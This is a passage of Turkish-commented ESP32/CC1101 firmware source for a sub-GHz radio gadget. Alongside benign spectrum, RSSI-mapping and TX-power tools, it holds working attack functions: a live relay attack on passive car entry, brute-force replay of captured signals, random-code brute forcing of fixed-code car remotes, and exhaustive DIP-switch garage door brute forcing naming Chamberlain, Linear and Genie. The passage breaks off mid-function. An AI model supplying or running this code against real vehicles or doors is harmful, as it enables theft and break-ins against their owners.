        sf.println("Total Pulses: " + String(totalPulses));
        sf.println("Format: " + String(fmt == 0 ? "CSV" : fmt == 1 ? "BIN" : "CSV+BIN"));
        sf.close();
    }

    logPush("[SDLOG] session done files=" + String(fileIndex)
            + " totalPulses=" + String(totalPulses));
    dispBannerOK(String(fileIndex) + " dosya kaydedildi (SD:" + sessionDir + ")");
}

// ─── 22. Sub-GHz Relay Attack ─────────────────────────────
// Pasif araç giriş sistemlerinde kullanılan "relay" saldırısı.
// Sinyal yakalar, anında (< 50ms gecikmeyle) tekrar yayar.
// Araç "anahtar yakında" sanarak kapıyı açar.
// NOT: Modern araçlar UWB/mesafe ölçümü kullanır, bu saldırı
//      RF-only passive entry sistemlerine (2015 öncesi yaygın) etkilidir.
static void cc1101_relay_attack_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"433.92 MHz (EU)", [](){}},
        {"315.00 MHz (US)", [](){}},
        {"434.42 MHz",      [](){}},
        {"Back",            [](){}},
    };
    int fs = loopOptions(freqOpts, "Relay: Frekans");
    if (fs < 0 || fs == 3) return;
    float rFreqs[] = {433.92f, 315.0f, 434.42f};
    cc1101_setFrequency(rFreqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);

    // Gecikme ayarı
    OptionList delayOpts = {
        {"<10ms  (max hiz)",  [](){}},
        {"20ms   (normal)",   [](){}},
        {"50ms   (yavas)",    [](){}},
        {"Back",              [](){}},
    };
    int ds = loopOptions(delayOpts, "Relay Gecikmesi");
    if (ds < 0 || ds == 3) return;
    uint16_t relayDelayMs = (ds == 0) ? 8 : (ds == 1) ? 20 : 50;

    dispClear(); dispStatusBar("Relay Attack");
    dispText(0, 10, "Frek: " + String(rFreqs[fs], 2) + " MHz");
    dispText(0, 20, "Gecikme: " + String(relayDelayMs) + " ms");
    dispText(0, 30, "Sinyal bekle → aninda");
    dispText(0, 40, "tekrar yayinla");
    dispText(0, 52, "[LONG] dur");
    dispCommit();
    delay(1000);

    cc1101_writeReg(CC1101_IOCFG0, 0x0D); // GDO0 = carrier sense
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    uint32_t relayCount = 0;
    uint32_t lastDraw   = 0;

    while (!readButtonLong()) {
        // Carrier sense bekle (GDO0 HIGH = sinyal var)
        if (digitalRead(PIN_CC1101_GDO0) == LOW) {
            delay(1);
            continue;
        }

        // Hızlı yakalama — min gecikmeyle
        g_rfCaptureLen = 0;
        bool     lv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lu = micros();
        uint32_t ct = millis();

        while (millis() - ct < 150 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cv != lv) {
                uint32_t now = micros();
                uint32_t dur = now - lu;
                if (dur > 30)
                    g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur,(uint32_t)65000), lv};
                lv = cv; lu = now;
            }
            if (g_rfCaptureLen > 8 && micros() - lu > 12000) break;
        }

        if (g_rfCaptureLen < 6) {
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_SRX);
            continue;
        }

        // Relay gecikmesi
        delay(relayDelayMs);

        // Hemen yayınla
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_STX);
        cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
        cc1101_strobe(CC1101_SIDLE);
        relayCount++;

        // Tekrar RX
        cc1101_strobe(CC1101_SRX);

        if (millis() - lastDraw > 400) {
            lastDraw = millis();
            dispClear(); dispStatusBar("RELAY AKTIF");
            dispText(0, 12, "Relay: " + String(relayCount));
            dispText(0, 22, String(rFreqs[fs], 2) + " MHz");
            dispText(0, 32, "Gecikme: " + String(relayDelayMs) + " ms");
            dispText(0, 42, "Son pulse: " + String(g_rfCaptureLen));
            dispText(0, 54, "[LONG] dur");
            dispCommit();
        }
    }

    cc1101_strobe(CC1101_SIDLE);
    logPush("[RELAY] count=" + String(relayCount)
            + " freq=" + String(rFreqs[fs], 2) + "MHz"
            + " delay=" + String(relayDelayMs) + "ms");
    dispBannerOK("Relay bitti: " + String(relayCount) + " paket");
}

// ─── 23. RSSI Harita Kaydedici ────────────────────────────
// Hareket ederken belirli frekansta RSSI değerlerini
// zaman damgasıyla SD kartta CSV olarak kaydeder.
// Bir vericinin yayın alanını haritalamak için kullanılır.
// Dosyayı Excel/Python ile işleyerek harita çizebilirsin.
static void cc1101_rssi_mapper_run() {
    if (!cc1101_ensureInit()) return;

    if (!g_sdInited) {
        dispBannerErr("SD kart gerekli!");
        return;
    }

    OptionList freqOpts = {
        {"433.92 MHz", [](){}},
        {"315.00 MHz", [](){}},
        {"868.30 MHz", [](){}},
        {"Mevcut Frek", [](){}},
        {"Back",        [](){}},
    };
    int fs = loopOptions(freqOpts, "RSSI Harita: Frek");
    if (fs < 0 || fs == 4) return;
    if (fs < 3) {
        float fqs[] = {433.92f, 315.0f, 868.30f};
        cc1101_setFrequency(fqs[fs]);
    }
    cc1101_setModulation(CC_MOD_ASKOOK);

    // Örnekleme hızı
    OptionList rateOpts = {
        {"100ms (hizli)", [](){}},
        {"500ms (normal)",[](){}},
        {"1s    (yavas)", [](){}},
        {"Back",          [](){}},
    };
    int rs = loopOptions(rateOpts, "Ornekleme Hizi");
    if (rs < 0 || rs == 3) return;
    uint16_t sampleMs = (rs == 0) ? 100 : (rs == 1) ? 500 : 1000;

    // SD'de oturum dosyası oluştur
    String csvPath = "/rssi_map_" + String(millis() / 1000) + ".csv";
    File csvF = SD.open(csvPath.c_str(), FILE_WRITE);
    if (!csvF) {
        dispBannerErr("SD yazma hatasi!");
        return;
    }
    // Başlık satırı
    csvF.println("# RSSI Harita Kaydedici");
    csvF.println("# Freq=" + String(g_cc1101Freq, 4) + "MHz Sample=" + String(sampleMs) + "ms");
    csvF.println("ms;rssi_dbm;min_rssi;max_rssi;avg_rssi");
    csvF.flush();

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    dispClear(); dispStatusBar("RSSI Harita");
    dispText(0, 10, "Frek: " + String(g_cc1101Freq, 2) + " MHz");
    dispText(0, 20, "Dosya: " + csvPath.substring(1, 20));
    dispText(0, 30, "Hareket et...");
    dispText(0, 42, "Her ornekte RSSI log");
    dispText(0, 54, "[LONG] bitir");
    dispCommit();
    delay(1500);

    uint32_t sampleCount = 0;
    uint32_t startMs     = millis();
    int8_t   minRSSI     = 0;
    int8_t   maxRSSI     = -120;
    int32_t  sumRSSI     = 0;
    uint32_t lastDraw    = 0;

    // RSSI geçmişi bar grafik için
    static int8_t rssiHistory[64];
    memset(rssiHistory, -120, sizeof(rssiHistory));
    uint8_t histIdx = 0;

    while (!readButtonLong()) {
        uint32_t loopStart = millis();

        // RSSI oku (birkaç örnek ortalaması)
        int32_t rssiSum = 0;
        for (uint8_t s = 0; s < 4; s++) {
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_SRX);
            delayMicroseconds(400);
            rssiSum += cc1101_getRSSI();
            cc1101_strobe(CC1101_SIDLE);
            delayMicroseconds(100);
        }
        int8_t rssi = (int8_t)(rssiSum / 4);

        // İstatistik
        sampleCount++;
        sumRSSI += rssi;
        if (rssi < minRSSI || sampleCount == 1) minRSSI = rssi;
        if (rssi > maxRSSI) maxRSSI = rssi;
        int8_t avgRSSI = (int8_t)(sumRSSI / (int32_t)sampleCount);

        // SD'ye yaz
        uint32_t elapsed = millis() - startMs;
        csvF.print(elapsed);
        csvF.print(';');
        csvF.print(rssi);
        csvF.print(';');
        csvF.print(minRSSI);
        csvF.print(';');
        csvF.print(maxRSSI);
        csvF.print(';');
        csvF.println(avgRSSI);

        // Her 10 örnekte bir flush
        if (sampleCount % 10 == 0) csvF.flush();

        // Geçmiş güncelle
        rssiHistory[histIdx] = rssi;
        histIdx = (histIdx + 1) % 64;

        logPush("[RSSI_MAP] t=" + String(elapsed) + " rssi=" + String(rssi));

        // Ekran güncelle
        if (millis() - lastDraw > 200) {
            lastDraw = millis();
            dispClear(); dispStatusBar("RSSI Harita");

            // Anlık değer (büyük font)
            dispText(0, 8, "RSSI: " + String(rssi) + " dBm");
            dispText(0, 18, "Min:" + String(minRSSI)
                          + " Max:" + String(maxRSSI)
                          + " Avg:" + String(avgRSSI));
            dispText(0, 28, "Ornek: " + String(sampleCount));

            // 64-nokta RSSI geçmişi çizgisi
            const int8_t  Y_MIN   = -120;
            const int8_t  Y_MAX   = -30;
            const uint8_t G_TOP   = 38;
            const uint8_t G_BOT   = 54;
            const uint8_t G_H     = G_BOT - G_TOP;

            // Referans çizgisi (-80 dBm)
            uint8_t refY = G_BOT - map(-80, Y_MIN, Y_MAX, 0, G_H);
            for (uint8_t x = 0; x < 64; x += 3)
                display.drawPixel(x * 2, refY, SSD1306_WHITE);

            // RSSI grafiği
            for (uint8_t i = 0; i < 63; i++) {
                uint8_t idx0 = (histIdx + i)     % 64;
                uint8_t idx1 = (histIdx + i + 1) % 64;
                if (rssiHistory[idx0] == -120 || rssiHistory[idx1] == -120) continue;
                uint8_t y0 = G_BOT - (uint8_t)map(
                    constrain((int)rssiHistory[idx0], Y_MIN, Y_MAX), Y_MIN, Y_MAX, 0, G_H);
                uint8_t y1 = G_BOT - (uint8_t)map(
                    constrain((int)rssiHistory[idx1], Y_MIN, Y_MAX), Y_MIN, Y_MAX, 0, G_H);
                display.drawLine(i * 2, y0, (i + 1) * 2, y1, SSD1306_WHITE);
            }
            dispText(0, 56, "[LONG] bitir");
            dispCommit();
        }

        // Örnekleme hızına göre bekle
        uint32_t elapsed2 = millis() - loopStart;
        if (elapsed2 < sampleMs) delay(sampleMs - elapsed2);
    }

    cc1101_strobe(CC1101_SIDLE);
    csvF.flush();
    csvF.close();

    logPush("[RSSI_MAP] done samples=" + String(sampleCount)
            + " min=" + String(minRSSI) + " max=" + String(maxRSSI));
    dispBannerOK(String(sampleCount) + " ornek → " + csvPath.substring(1, 18));
}

// ─── 24. TX Güç Menüsü ────────────────────────────────────
// CC1101 PATABLE üzerinden TX gücünü 8 seviyede ayarlar.
// Yakın mesafe testlerinde düşük güç, uzak hedefler için max.
// 433 MHz için TI datasheet PATABLE değerleri kullanılır.
static void cc1101_tx_power_run() {
    if (!cc1101_ensureInit()) return;

    // TI CC1101 datasheet Tablo 39 — 433 MHz PATABLE değerleri
    // (dBm → PATABLE byte)
    struct PowerLevel {
        const char* label;
        uint8_t     paVal;
        int8_t      dbm;
    };
    static const PowerLevel levels[] = {
        {"-30 dBm", 0x03, -30},
        {"-20 dBm", 0x0E, -20},
        {"-15 dBm", 0x1E, -15},
        {"-10 dBm", 0x27, -10},
        {"  0 dBm", 0x50,   0},
        {" +5 dBm", 0x81,   5},
        {"+10 dBm", 0xC0,  10},
        {"+12 dBm", 0xC3,  12},  // MAX
    };
    static constexpr uint8_t NUM_LEVELS = 8;

    // Mevcut g_cc1101Power ile eşleşen seviyeyi bul
    uint8_t curIdx = NUM_LEVELS - 1; // default: max
    for (uint8_t i = 0; i < NUM_LEVELS; i++) {
        if (levels[i].paVal == g_cc1101Power) { curIdx = i; break; }
    }

    OptionList opts;
    for (uint8_t i = 0; i < NUM_LEVELS; i++) {
        String label = String(levels[i].label);
        if (levels[i].paVal == g_cc1101Power)
            label += " <--";  // aktif olan işaretli
        opts.push_back({label, [](){}});
    }
    opts.push_back({"Back", [](){}});

    dispClear(); dispStatusBar("TX Guc Ayari");
    dispText(0, 10, "Mevcut: " + String(levels[curIdx].label));
    dispText(0, 20, "PA: 0x" + String(g_cc1101Power, HEX));
    dispText(0, 32, "Bir seviye sec:");
    dispCommit();
    delay(600);

    int sel = loopOptions(opts, "TX Guc");
    if (sel < 0 || sel == NUM_LEVELS) return;

    // Seçilen güç seviyesini uygula
    g_cc1101Power = levels[sel].paVal;

    // PATABLE'ı güncelle
    uint8_t paTable[8] = {0x00, g_cc1101Power, 0x00, 0x00,
                          0x00, 0x00,           0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);

    logPush("[TX_PWR] set=" + String(levels[sel].label)
            + " PA=0x" + String(g_cc1101Power, HEX));
    dispBannerOK("TX Guc: " + String(levels[sel].label)
               + " (0x" + String(g_cc1101Power, HEX) + ")");
}

// ─── 16. Spectrum Analyzer ────────────────────────────────
// Belirli bir frekans aralığında adım adım tarama yaparak
// her kanalda RSSI ölçer ve OLED'de bar grafik gösterir.
// Flipper Zero Sub-GHz Spectrum Analyzer'ına benzer.
static void cc1101_spectrum_run() {
    if (!cc1101_ensureInit()) return;

    // Merkez frekans ve tarama aralığı seç
    OptionList bandOpts = {
        {"433 MHz +-1MHz",  [](){}},
        {"433 MHz +-500kHz",[](){}},
        {"868 MHz +-1MHz",  [](){}},
        {"915 MHz +-1MHz",  [](){}},
        {"315 MHz +-1MHz",  [](){}},
        {"Back",            [](){}},
    };
    int bs = loopOptions(bandOpts, "Spectrum Band");
    if (bs < 0 || bs == 5) return;

    float centerFreq;
    float spanMHz;
    switch (bs) {
        case 0: centerFreq = 433.92f; spanMHz = 2.0f; break;
        case 1: centerFreq = 433.92f; spanMHz = 1.0f; break;
        case 2: centerFreq = 868.30f; spanMHz = 2.0f; break;
        case 3: centerFreq = 915.00f; spanMHz = 2.0f; break;
        case 4: centerFreq = 315.00f; spanMHz = 2.0f; break;
        default: centerFreq = 433.92f; spanMHz = 2.0f; break;
    }

    // OLED genişliği = 128 px → 128 kanal adımı
    static constexpr uint8_t SPEC_COLS = 128;
    float startFreq = centerFreq - spanMHz / 2.0f;
    float stepMHz   = spanMHz / (float)SPEC_COLS;

    int8_t rssiHistory[SPEC_COLS];
    int8_t rssiPeak[SPEC_COLS];
    memset(rssiHistory, -120, sizeof(rssiHistory));
    memset(rssiPeak,    -120, sizeof(rssiPeak));

    // CC1101'i dar kanal moduna al (en iyi çözünürlük için)
    cc1101_writeReg(CC1101_MDMCFG4, 0xF7); // BW ~58 kHz
    cc1101_writeReg(CC1101_MDMCFG3, 0x83);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_AGCCTRL2, 0x43);
    cc1101_writeReg(CC1101_AGCCTRL1, 0x40);
    cc1101_writeReg(CC1101_AGCCTRL0, 0x91);

    uint32_t sweepCount = 0;
    int8_t   globalPeak = -120;
    uint8_t  peakCol    = 0;

    dispClear(); dispStatusBar("Spectrum Analiz");
    dispText(0, 20, "Taranıyor...");
    dispText(0, 32, String(startFreq, 2) + " - " + String(startFreq + spanMHz, 2) + " MHz");
    dispCommit();
    delay(400);

    while (!readButtonLong()) {
        // Tüm kolonları tara
        for (uint8_t col = 0; col < SPEC_COLS; col++) {
            float freq = startFreq + col * stepMHz;
            cc1101_setFrequency(freq);
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_SRX);
            delayMicroseconds(300); // yerleşme süresi
            int8_t rssi = cc1101_getRSSI();
            cc1101_strobe(CC1101_SIDLE);
            rssiHistory[col] = rssi;
            if (rssi > rssiPeak[col]) rssiPeak[col] = rssi;
            if (rssi > globalPeak)   { globalPeak = rssi; peakCol = col; }
        }
        sweepCount++;

        // Ekran güncelle
        dispClear(); dispStatusBar("Spectrum");

        // Y ekseni: -120 dBm (alt) → -40 dBm (üst) = 80 dB aralık
        // Grafik alanı: y=11 (üst) → y=54 (alt) = 43 px
        const int8_t  Y_MIN = -120;
        const int8_t  Y_MAX = -40;
        const uint8_t GRAPH_TOP  = 11;
        const uint8_t GRAPH_BOT  = 54;
        const uint8_t GRAPH_H    = GRAPH_BOT - GRAPH_TOP;

        // Arka plan çizgisi (-80 dBm referans)
        uint8_t refY = GRAPH_BOT - map(-80, Y_MIN, Y_MAX, 0, GRAPH_H);
        for (uint8_t x = 0; x < SPEC_COLS; x += 4)
            display.drawPixel(x, refY, SSD1306_WHITE);

        // Peak tutma çizgisi
        for (uint8_t col = 0; col < SPEC_COLS; col++) {
            uint8_t py = GRAPH_BOT - (uint8_t)map(
                constrain(rssiPeak[col], Y_MIN, Y_MAX), Y_MIN, Y_MAX, 0, GRAPH_H);
            if (py >= GRAPH_TOP && py <= GRAPH_BOT)
                display.drawPixel(col, py, SSD1306_WHITE);
        }

        // Anlık sinyal barları
        for (uint8_t col = 0; col < SPEC_COLS; col++) {
            uint8_t barH = (uint8_t)map(
                constrain(rssiHistory[col], Y_MIN, Y_MAX), Y_MIN, Y_MAX, 0, GRAPH_H);
            if (barH > 0)
                display.drawFastVLine(col, GRAPH_BOT - barH, barH, SSD1306_WHITE);
        }

        // Peak marker (küçük üçgen)
        uint8_t pkY = GRAPH_BOT - (uint8_t)map(
            constrain(globalPeak, Y_MIN, Y_MAX), Y_MIN, Y_MAX, 0, GRAPH_H);
        display.drawLine(peakCol - 2, GRAPH_TOP, peakCol + 2, GRAPH_TOP, SSD1306_WHITE);
        display.drawLine(peakCol, GRAPH_TOP, peakCol, GRAPH_TOP + 3, SSD1306_WHITE);

        // Alt bilgi satırı
        float peakFreq = startFreq + peakCol * stepMHz;
        char infoBuf[22];
        snprintf(infoBuf, sizeof(infoBuf), "%.2fMHz %ddBm #%u",
                 peakFreq, (int)globalPeak, (unsigned)sweepCount);
        dispText(0, 56, String(infoBuf));

        dispCommit();
        // Joystick ile peak tutmayı sıfırla
        JoyDir jd = readJoystick();
        if (jd == JoyDir::DOWN) {
            memset(rssiPeak, -120, sizeof(rssiPeak));
            globalPeak = -120;
        }
    }

    cc1101_strobe(CC1101_SIDLE);
    cc1101_setFrequency(g_cc1101Freq);
    // MDMCFG4/3 varsayılana dön
    cc1101_writeReg(CC1101_MDMCFG4, 0xF5);
    cc1101_writeReg(CC1101_MDMCFG3, 0x83);
    logPush("[SPEC] sweeps=" + String(sweepCount)
            + " peak=" + String(globalPeak)
            + "dBm@" + String(startFreq + peakCol * stepMHz, 2) + "MHz");
    dispBannerOK("Spectrum bitti: " + String(sweepCount) + " sweep");
}

// ─── 12. Brute Force Replay ───────────────────────────────
// Kayıtlı sinyali art arda çok kez gönderir.
// Pottan tekrar sayısı, joystick'ten gecikme ayarlanır.
static void cc1101_brute_replay_run() {
    if (!cc1101_ensureInit()) return;

    if (!spiffs_ensure()) {
        dispBannerErr("SPIFFS hatasi!");
        return;
    }

    std::vector<String> files = rf_capture_list();
    if (files.empty()) {
        dispBannerWarn("Kayitli sinyal yok!");
        return;
    }

    OptionList fileOpts;
    for (auto& f : files) {
        String shortName = f;
        if (shortName.startsWith("spiffs:"))
            shortName = "[S]" + shortName.substring(shortName.lastIndexOf('/') + 1);
        else if (shortName.startsWith("sd:"))
            shortName = "[D]" + shortName.substring(shortName.lastIndexOf('/') + 1);
        if (shortName.endsWith(".bin"))
            shortName = shortName.substring(0, shortName.length() - 4);
        if (shortName.length() > 17) shortName = shortName.substring(0, 16) + "~";
        fileOpts.push_back({shortName, [](){}});
    }
    fileOpts.push_back({"Back", [](){}});

    int sel = loopOptions(fileOpts, "BF Replay: Dosya");
    if (sel < 0 || sel == (int)fileOpts.size() - 1) return;

    dispProgress("BF Replay", "Yukleniyor...", 30);
    if (!rf_capture_load(files[sel])) {
        dispBannerErr("Yuklenemedi!");
        return;
    }

    // Kullanıcıya tekrar sayısı ve gecikmeyi göster, ayarlamasını bekle
    dispClear(); dispStatusBar("BF Replay Ayar");
    dispText(0, 12, "Pot: tekrar sayisi");
    dispText(0, 22, "JoyU/D: gecikme ms");
    dispText(0, 32, "BTN: basla LONG: cik");
    dispCommit();

    uint16_t repeatCount = 50;
    uint16_t delayMs     = 20;

    // Ayar ekranı
    uint32_t configStart = millis();
    while (millis() - configStart < 8000 && !readButton()) {
        if (readButtonLong()) return;
        uint16_t potRaw  = analogRead(PIN_POT);
        repeatCount      = map(potRaw, 0, 4095, 5, 500);
        JoyDir jd        = readJoystick();
        if (jd == JoyDir::UP   && delayMs < 500) delayMs += 5;
        if (jd == JoyDir::DOWN && delayMs > 5)   delayMs -= 5;

        dispClear(); dispStatusBar("BF Replay Ayar");
        dispText(0, 12, "Tekrar: " + String(repeatCount));
        dispText(0, 22, "Gecikme: " + String(delayMs) + " ms");
        dispText(0, 32, "Pulse: " + String(g_rfCaptureLen));
        dispText(0, 42, "Frek: " + String(g_cc1101Freq, 2) + "MHz");
        dispText(0, 54, "BTN:basla LONG:cik");
        dispCommit();
        delay(60);
    }
    if (readButtonLong()) return;

    // Gönderim döngüsü
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setFrequency(g_cc1101Freq);

    uint32_t lastDraw = 0;
    for (uint16_t i = 1; i <= repeatCount; i++) {
        if (readButtonLong()) {
            logPush("[BF_REPLAY] stopped at " + String(i));
            dispBannerWarn("Durduruldu: " + String(i) + "/" + String(repeatCount));
            return;
        }
        cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
        delay(delayMs);

        if (millis() - lastDraw > 200) {
            lastDraw = millis();
            dispClear(); dispStatusBar("BF Replay");
            dispText(0, 14, "Gonderiliyor...");
            dispText(0, 26, String(i) + " / " + String(repeatCount));
            // İlerleme çubuğu
            uint8_t barW = map(i, 0, repeatCount, 0, OLED_W - 4);
            display.drawRect(2, 40, OLED_W - 4, 8, SSD1306_WHITE);
            if (barW > 0) display.fillRect(2, 40, barW, 8, SSD1306_WHITE);
            dispText(0, 54, "[LONG] dur");
            dispCommit();
        }
    }
    cc1101_strobe(CC1101_SIDLE);
    buzzRFReplay();
    logPush("[BF_REPLAY] done " + String(repeatCount) + "x file=" + files[sel]);
    g_xpBadusbCnt++;
    xpAdd(XP_PER_BADUSB);
    dispBannerOK("Bitti! " + String(repeatCount) + "x gonderildi");
}

// ─── 13. Araba Kapı Brute Force ───────────────────────────
// OOK/ASK modülasyonunda rastgele 64-bit kod dizileri göndererek
// fixed-code (eski nesil) araç kumandalarını denemeye çalışır.
// NOT: Modern araçlar rolling code kullandığından bu sadece eski
//      veya fixed-code sistemlere (bazı garaj kapıları, eski araçlar) etki eder.
static void cc1101_car_brute_run() {
    if (!cc1101_ensureInit()) return;

    // Frekans seç
    OptionList freqOpts = {
        {"433.92 MHz (EU)", [](){}},
        {"315.00 MHz (US)", [](){}},
        {"434.42 MHz",      [](){}},
        {"Back",            [](){}},
    };
    int fs = loopOptions(freqOpts, "Araba BF: Frek");
    if (fs < 0 || fs == 3) return;
    float freqs[] = {433.92f, 315.0f, 434.42f};
    cc1101_setFrequency(freqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setBaudRate(4800);

    // Kod uzunluğu seç
    OptionList lenOpts = {
        {"12-bit (kisa)",   [](){}},
        {"24-bit (orta)",   [](){}},
        {"64-bit (uzun)",   [](){}},
        {"Back",            [](){}},
    };
    int ls = loopOptions(lenOpts, "Kod Uzunlugu");
    if (ls < 0 || ls == 3) return;
    uint8_t codeBits = (ls == 0) ? 12 : (ls == 1) ? 24 : 64;

    // Pot → gönderim hızı, Joy → gecikme
    dispClear(); dispStatusBar("Araba BF Ayar");
    dispText(0, 12, "Pot: hiz (baud)");
    dispText(0, 22, "JoyU/D: gecikme");
    dispText(0, 32, "Bit: " + String(codeBits));
    dispText(0, 42, "Frek: " + String(freqs[fs], 2) + "MHz");
    dispText(0, 54, "BTN: basla LONG: cik");
    dispCommit();

    uint16_t interPktDelay = 10; // ms, paketler arası
    uint32_t cfgStart = millis();
    while (millis() - cfgStart < 6000 && !readButton()) {
        if (readButtonLong()) return;
        JoyDir jd = readJoystick();
        if (jd == JoyDir::UP   && interPktDelay < 200) interPktDelay += 5;
        if (jd == JoyDir::DOWN && interPktDelay > 2)   interPktDelay -= 2;
        dispClear(); dispStatusBar("Araba BF Ayar");
        dispText(0, 12, "Gecikme: " + String(interPktDelay) + " ms");
        dispText(0, 22, String(codeBits) + "-bit @ " + String(freqs[fs], 2) + "MHz");
        dispText(0, 34, "ASK/OOK modülasyonu");
        dispText(0, 54, "BTN:basla LONG:cik");
        dispCommit();
        delay(50);
    }
    if (readButtonLong()) return;

    // OOK pulse parametreleri: 1 bit = 600µs HIGH + 200µs LOW (1)
    //                                  200µs HIGH + 600µs LOW (0)
    // Preamble: 10101010... (8 bit senkronizasyon)
    static constexpr uint16_t T_SHORT = 300;   // µs
    static constexpr uint16_t T_LONG  = 900;   // µs
    static constexpr uint16_t T_SYNC  = 9000;  // sync gap µs

    uint32_t attempts   = 0;
    uint32_t lastDraw   = 0;
    uint64_t currentCode = 0;

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);
    delayMicroseconds(200);

    while (!readButtonLong()) {
        // Rastgele kod üret (codeBits uzunluğunda)
        uint64_t code = 0;
        for (uint8_t b = 0; b < 8; b++) {
            code = (code << 8) | (uint8_t)esp_random();
        }
        // codeBits'e mask uygula
        if (codeBits < 64) {
            code &= ((uint64_t)1 << codeBits) - 1;
        }
        currentCode = code;

        // Pulse dizisi oluştur:
        // Preamble (8 bit 10101010)
        // Sync gap
        // Data bits (codeBits adet)
        // Son: sync gap

        // Preamble
        for (uint8_t p = 0; p < 8; p++) {
            uint8_t bit = (p % 2);
            uint8_t paOn[2]  = {0x00, g_cc1101Power};
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, bit ? paOn : paOff, 2);
            delayMicroseconds(T_SHORT);
        }
        // Sync gap
        {
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
            delayMicroseconds(T_SYNC);
        }
        // Data bits (MSB first)
        for (int8_t b = (int8_t)codeBits - 1; b >= 0; b--) {
            uint8_t bit = (code >> b) & 1;
            uint8_t paOn[2]  = {0x00, g_cc1101Power};
            uint8_t paOff[2] = {0x00, 0x00};
            if (bit) {
                cc1101_writeBurst(CC1101_PATABLE, paOn, 2);
                delayMicroseconds(T_LONG);
                cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
                delayMicroseconds(T_SHORT);
            } else {
                cc1101_writeBurst(CC1101_PATABLE, paOn, 2);
                delayMicroseconds(T_SHORT);
                cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
                delayMicroseconds(T_LONG);
            }
        }
        // Son sync
        {
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
            delayMicroseconds(T_SYNC);
        }
        attempts++;
        delay(interPktDelay);

        if (millis() - lastDraw > 250) {
            lastDraw = millis();
            dispClear(); dispStatusBar("Araba Kapi BF");
            dispText(0, 12, "Deneme: " + String(attempts));
            dispText(0, 22, "Frek: " + String(freqs[fs], 2) + "MHz");
            dispText(0, 32, "Bits: " + String(codeBits));
            // Kod hex göster (alt 32-bit)
            char hexBuf[12];
            snprintf(hexBuf, sizeof(hexBuf), "%08X", (uint32_t)(currentCode & 0xFFFFFFFF));
            dispText(0, 42, "Kod: 0x" + String(hexBuf));
            dispText(0, 54, "[LONG] dur");
            dispCommit();
        }
    }

    cc1101_strobe(CC1101_SIDLE);
    {
        uint8_t paFinal[2] = {0x00, g_cc1101Power};
        cc1101_writeBurst(CC1101_PATABLE, paFinal, 2);
    }
    logPush("[CAR_BF] attempts=" + String(attempts)
            + " freq=" + String(freqs[fs], 2)
            + " bits=" + String(codeBits));
    dispBannerOK("Bitti: " + String(attempts) + " deneme");
}

// ─── 14. Garaj Kapısı Brute Force ────────────────────────
// DIP switch tabanlı garaj kapısı kumandaları (Chamberlain,
// Linear, Genie eski seri) sabit 9-12 bit kod kullanır.
// Tüm olası kombinasyonları sırayla dener (tam brute force).
static void cc1101_garage_brute_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"390.00 MHz (Genie)",       [](){}},
        {"315.00 MHz (Chamberlain)", [](){}},
        {"433.92 MHz (EU)",          [](){}},
        {"300.00 MHz (Linear)",      [](){}},
        {"Back",                     [](){}},
    };
    int fs = loopOptions(freqOpts, "Garaj BF: Frek");
    if (fs < 0 || fs == 4) return;
    float gFreqs[] = {390.0f, 315.0f, 433.92f, 300.0f};
    cc1101_setFrequency(gFreqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setBaudRate(2400);

    // Bit sayısı seç — DIP switch sistemler
    OptionList bitOpts = {
        {"9-bit  (512 kombinasyon)",  [](){}},
        {"10-bit (1024 kombinasyon)", [](){}},
        {"12-bit (4096 kombinasyon)", [](){}},
        {"Back",                      [](){}},
    };
    int bl = loopOptions(bitOpts, "DIP Bit Sayisi");
    if (bl < 0 || bl == 3) return;
    uint16_t totalCodes = (bl == 0) ? 512 : (bl == 1) ? 1024 : 4096;
    uint8_t  codeBits   = (bl == 0) ? 9   : (bl == 1) ? 10   : 12;

    // Gönderim modu seç
    OptionList modeOpts = {
        {"Sirayla (0→max)",  [](){}},
        {"Rastgele",         [](){}},
        {"Back",             [](){}},
    };
    int ms = loopOptions(modeOpts, "Gonderim Modu");
    if (ms < 0 || ms == 2) return;
    bool sequential = (ms == 0);

    dispClear(); dispStatusBar("Garaj BF Hazir");
    dispText(0, 12, String(totalCodes) + " kod denenecek");
    dispText(0, 22, String(codeBits) + "-bit @ " + String(gFreqs[fs], 1) + "MHz");
    dispText(0, 32, sequential ? "Sirayla" : "Rastgele");
    dispText(0, 44, "BTN: basla");
    dispText(0, 54, "LONG: iptal");
    dispCommit();

    while (!readButton()) {
        if (readButtonLong()) return;
        delay(30);
    }

    // OOK pulse parametreleri (Chamberlain/Linear tarzı):
    // HIGH period = 1ms ("1"), LOW period = 1ms ("0")
    // Header: uzun HIGH (9ms)
    // Her bit: 1ms HIGH için (1), 1ms LOW için (0)
    // Footer: uzun LOW (9ms)
    static constexpr uint16_t T_BIT   = 1000; // µs per bit
    static constexpr uint16_t T_HDR   = 9000; // µs header
